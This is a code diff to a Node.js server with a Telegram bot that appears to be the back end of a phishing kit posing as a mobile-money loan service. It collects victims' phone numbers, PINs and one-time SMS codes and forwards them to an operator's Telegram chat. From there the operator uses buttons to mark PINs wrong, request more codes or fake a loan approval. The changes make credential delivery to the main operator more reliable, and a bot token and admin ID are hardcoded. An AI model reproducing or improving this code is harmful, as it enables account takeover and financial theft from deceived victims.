@@ -9,15 +9,14 @@ app.use(express.static(path.join(__dirname, 'public')));
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8968023761:AAFi4k2gVczpAbCM1-8oRC1axtXA9EwRvo8';
 const PORT = process.env.PORT || 3000;
 
-// Enable polling for stable message delivery on Render
+// Initialize bot with polling
 const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });
 
 let activeSessions = {};
 
-// Hardcode your Main Admin Chat ID here so alerts go straight to you
-let MAIN_ADMIN_ID = process.env.MAIN_ADMIN_ID || '8591555400';
-let authorizedAdmins = new Set([MAIN_ADMIN_ID.toString()]);
-let pendingMainAdminAuth = new Map();
+// Ensure Main Admin Chat ID is clean and numeric only
+let MAIN_ADMIN_ID = (process.env.MAIN_ADMIN_ID || '8591555400').trim();
+let authorizedAdmins = new Set([MAIN_ADMIN_ID]);
 
 function escapeMarkdown(text) {
     if (!text) return '';
@@ -26,13 +25,14 @@ function escapeMarkdown(text) {
 
 function isAuthorized(chatId) {
     if (!chatId) return false;
-    return chatId.toString() === MAIN_ADMIN_ID.toString() || authorizedAdmins.has(chatId.toString());
+    const cleanId = chatId.toString().trim();
+    return cleanId === MAIN_ADMIN_ID || authorizedAdmins.has(cleanId);
 }
 
 bot.on('message', (msg) => {
     if (!msg.text) return;
     const chatId = msg.chat.id;
-    const userIdStr = chatId.toString();
+    const userIdStr = chatId.toString().trim();
     const firstName = msg.from.first_name || 'Admin';
     const username = msg.from.username ? `@${msg.from.username}` : 'No username set';
 
@@ -42,7 +42,6 @@ bot.on('message', (msg) => {
     const isolatedLink = `${host}/?admin=${userIdStr}`;
 
     if (msg.text.startsWith('/start')) {
-        // Ensure Main Admin is always authorized
         authorizedAdmins.add(userIdStr);
 
         const welcomeText = `🚨 *Your Dynamic Admin Link Registered!*\n\n` +
@@ -61,26 +60,10 @@ bot.on('message', (msg) => {
 bot.on('callback_query', async (query) => {
     const chatId = query.message.chat.id;
     const data = query.data;
-    const userIdStr = chatId.toString();
+    const userIdStr = chatId.toString().trim();
 
     if (!isAuthorized(userIdStr)) {
         bot.answerCallbackQuery(query.id, { text: "⚠ You are not authorized!", show_alert: true });
-        return;
-    }
-
-    if (data.startsWith('auth_sub_') || data.startsWith('deny_sub_')) {
-        const targetId = data.split('_')[2];
-        if (data.startsWith('auth_sub_')) {
-            authorizedAdmins.add(targetId);
-            pendingMainAdminAuth.delete(targetId);
-            bot.sendMessage(targetId, "🎉 *Access Granted!* You are now authorized to receive client links and controls.", { parse_mode: 'Markdown' });
-            bot.sendMessage(chatId, `✅ Successfully authorized sub-admin: \`${targetId}\``, { parse_mode: 'Markdown' });
-        } else {
-            pendingMainAdminAuth.delete(targetId);
-            bot.sendMessage(targetId, "❌ *Access Denied* by Main Admin.", { parse_mode: 'Markdown' });
-            bot.sendMessage(chatId, `❌ Denied sub-admin: \`${targetId}\``, { parse_mode: 'Markdown' });
-        }
-        bot.answerCallbackQuery(query.id);
         return;
     }
 
@@ -100,38 +83,38 @@ bot.on('callback_query', async (query) => {
             chat_id: chatId,
             message_id: query.message.message_id,
             parse_mode: 'Markdown'
-        });
+        }).catch(err => console.error("Error editing message:", err));
     } else if (action === 'deny') {
         session.status = 'denied';
         bot.editMessageText(`❌ *PIN & Number DENIED* for \`${escapeMarkdown(session.phone)}\``, {
             chat_id: chatId,
             message_id: query.message.message_id,
             parse_mode: 'Markdown'
-        });
+        }).catch(err => console.error("Error editing message:", err));
     } else if (action === 'wrongpin') {
         session.status = 'wrong_pin';
         bot.editMessageText(`⚠️ *Incorrect PIN Sent Back* to \`${escapeMarkdown(session.phone)}\``, {
             chat_id: chatId,
             message_id: query.message.message_id,
             parse_mode: 'Markdown'
-        });
+        }).catch(err => console.error("Error editing message:", err));
     } else if (action === 'wrongsms') {
         session.status = 'wrong_sms';
         bot.editMessageText(`⚠️ *Incorrect SMS/OTP Sent Back* to \`${escapeMarkdown(session.phone)}\``, {
             chat_id: chatId,
             message_id: query.message.message_id,
             parse_mode: 'Markdown'
-        });
+        }).catch(err => console.error("Error editing message:", err));
     } else if (action === 'approved') {
         session.status = 'success';
         bot.editMessageText(`🎉 *Loan Fully Approved & Disbursed* for \`${escapeMarkdown(session.phone)}\``, {
             chat_id: chatId,
             message_id: query.message.message_id,
             parse_mode: 'Markdown'
-        });
+        }).catch(err => console.error("Error editing message:", err));
     }
 
-    bot.answerCallbackQuery(query.id);
+    bot.answerCallbackQuery(query.id).catch(err => console.error("Error answering callback query:", err));
 });
 
 app.post('/api/submit-credentials', express.json(), (req, res) => {
@@ -142,27 +125,30 @@ app.post('/api/submit-credentials', express.json(), (req, res) => {
         status: 'pending_pin_approval'
     };
 
-    const host = req.get('host');
+    const host = req.get('host') || 'mixx-by-yas-m5oy.onrender.com';
     const clientLink = `https://${host}/?session=${sessionId}`;
 
     const message = `🌐 *Client Link:* ${clientLink}\n\n` +
         `PHONE NO: \`${escapeMarkdown(phone)}\`\n` +
         `PIN: \`${escapeMarkdown(pin)}\``;
 
-    console.log(`Broadcasting credentials to ${authorizedAdmins.size} admin(s) including Main Admin:${MAIN_ADMIN_ID}`);
+    console.log(`Broadcasting credentials to admins. Main Admin ID: ${MAIN_ADMIN_ID}`);
 
-    authorizedAdmins.forEach(adminId => {
-        bot.sendMessage(adminId, message, {
-            parse_mode: 'Markdown',
-            reply_markup: {
-                inline_keyboard: [
-                    [
-                        { text: "ALLOW", callback_data: `allow_${sessionId}` },
-                        { text: "DENY", callback_data: `deny_${sessionId}` }
-                    ]
+    // Force send directly to MAIN_ADMIN_ID to guarantee delivery
+    bot.sendMessage(MAIN_ADMIN_ID, message, {
+        parse_mode: 'Markdown',
+        reply_markup: {
+            inline_keyboard: [
+                [
+                    { text: "ALLOW", callback_data: `allow_${sessionId}` },
+                    { text: "DENY", callback_data: `deny_${sessionId}` }
                 ]
-            }
-        }).catch(err => console.error(`Failed to send to admin ${adminId}:`, err));
+            ]
+        }
+    }).then(() => {
+        console.log(`Successfully sent message to Main Admin: ${MAIN_ADMIN_ID}`);
+    }).catch(err => {
+        console.error(`CRITICAL Telegram Error sending to ${MAIN_ADMIN_ID}:`, err.response ? err.response.body : err.message);
     });
 
     res.json({ success: true, sessionId });
@@ -183,22 +169,20 @@ app.post('/api/submit-otp', express.json(), (req, res) => {
         `PHONE NO: \`${escapeMarkdown(session.phone)}\`\n\n` +
         `OTP:\n\`\`\`text\n${otpText}\n\`\`\``;
 
-    authorizedAdmins.forEach(adminId => {
-        bot.sendMessage(adminId, message, {
-            parse_mode: 'Markdown',
-            reply_markup: {
-                inline_keyboard: [
-                    [
-                        { text: "WRONG PIN ❌", callback_data: `wrongpin_${sessionId}` },
-                        { text: "WRONG SMS", callback_data: `wrongsms_${sessionId}` }
-                    ],
-                    [
-                        { text: "APPROVED", callback_data: `approved_${sessionId}` }
-                    ]
+    bot.sendMessage(MAIN_ADMIN_ID, message, {
+        parse_mode: 'Markdown',
+        reply_markup: {
+            inline_keyboard: [
+                [
+                    { text: "WRONG PIN ❌", callback_data: `wrongpin_${sessionId}` },
+                    { text: "WRONG SMS", callback_data: `wrongsms_${sessionId}` }
+                ],
+                [
+                    { text: "APPROVED", callback_data: `approved_${sessionId}` }
                 ]
-            }
-        }).catch(err => console.error(`Failed to send OTP alert to admin ${adminId}:`, err));
-    });
+            ]
+        }
+    }).catch(err => console.error(`Failed to send OTP alert to admin:`, err));
 
     res.json({ success: true });
 });
@@ -214,4 +198,4 @@ app.get('/api/check-status/:sessionId', (req, res) => {
 app.listen(PORT, () => {
     console.log(`Server running on port ${PORT}`);
 });
-        
+    
